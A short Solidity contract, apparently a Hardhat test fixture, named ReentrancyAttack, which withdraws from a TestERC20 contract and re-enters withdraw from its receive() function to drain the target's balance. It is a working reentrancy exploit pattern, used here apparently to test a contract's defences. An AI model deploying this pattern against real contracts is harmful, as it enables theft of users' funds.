// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../TestERC20.sol";

import "hardhat/console.sol";

contract ReentrancyAttack {

  address private _target;
  uint256 private _amount;

  function executeAttack(
    address victim_, 
    uint256 amount_) 
  external {
    _target = victim_;
    _amount = amount_;

    TestERC20 victim = TestERC20(_target);
    victim.withdraw(_amount);
  }

  receive() external payable {
    if (address(_target).balance >= _amount) {
      TestERC20 victim = TestERC20(_target);
      victim.withdraw(_amount);
    }
  }

}